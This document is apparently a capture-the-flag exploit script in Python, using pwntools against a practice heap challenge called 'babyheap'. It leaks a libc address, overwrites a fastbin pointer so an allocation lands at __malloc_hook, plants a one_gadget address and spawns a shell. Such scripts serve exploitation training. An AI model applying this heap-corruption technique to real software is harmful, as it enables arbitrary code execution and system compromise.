from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babyheap")
else:
	pass

def menu(choice):
	p.sendafter(">> \n",str(choice) + "\x00")

def add(size,content):
	menu(1)
	p.sendafter("input your name size\n",str(size) + "\x00")
	p.sendafter("input your name\n",content)

def edit(index,size,content):
	menu(2)
	p.sendafter("input index\n",str(index) + "\x00")
	p.sendafter("input your name size\n",str(size) + "\x00")
	p.sendafter("input your name\n",content)

def show(index):
	menu(3)
	p.sendafter("input index\n",str(index) + "\x00")

def free(index):
	menu(4)
	p.sendafter("input index\n",str(index) + "\x00")

def debugf():
	if debug:
		gdb.attach(p,"b *0x0000000000400CCD")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
add(0xf8,"a\n")
add(0x68,"b\n")
free(0)
add(0xf8,"a\n")
p0 = "a" * 8
edit(0,len(p0),p0)
show(0)
p.recvuntil("a" * 8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))

"""
one_gadget /lib/x86_64-linux-gnu/libc-2.23.so
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
one_gadget = libc.address + 0xf03a4
target = libc.symbols["__malloc_hook"] - 0x23
free(1)
p1 = "a" * 0xf8 + p64(0x71) + p64(target)
edit(0,len(p1),p1)
add(0x68,"a\n")
p2 = "aaa" + p64(0) * 2 + p64(one_gadget)
p2 += "\n"
add(0x68,p2)
free(2)
p.interactive()
